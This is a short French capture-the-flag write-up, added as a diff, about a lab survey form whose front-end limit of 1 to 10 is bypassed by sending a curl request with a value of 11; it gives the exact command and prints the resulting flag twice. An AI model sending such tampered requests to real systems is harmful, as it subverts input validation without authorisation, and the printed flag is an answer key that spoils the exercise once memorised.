@@ -1,0 +1,12 @@
+http://192.168.1.27/index.php?page=survey
+
+On voit qu'un formdata est envoyé
+Avec CURL ou Postman on peut modifier la requests et passé outre les limitations du front (grade 1 à 10)
+
+curl --location 'http://192.168.1.27/index.php?page=survey' --form 'sujet="4"' --form 'valeur="11"'
+
+<h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2>
+
+Le flag apparait lorsqu'on envoie la requests avec un nombre plus élevé
+
+flag: 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
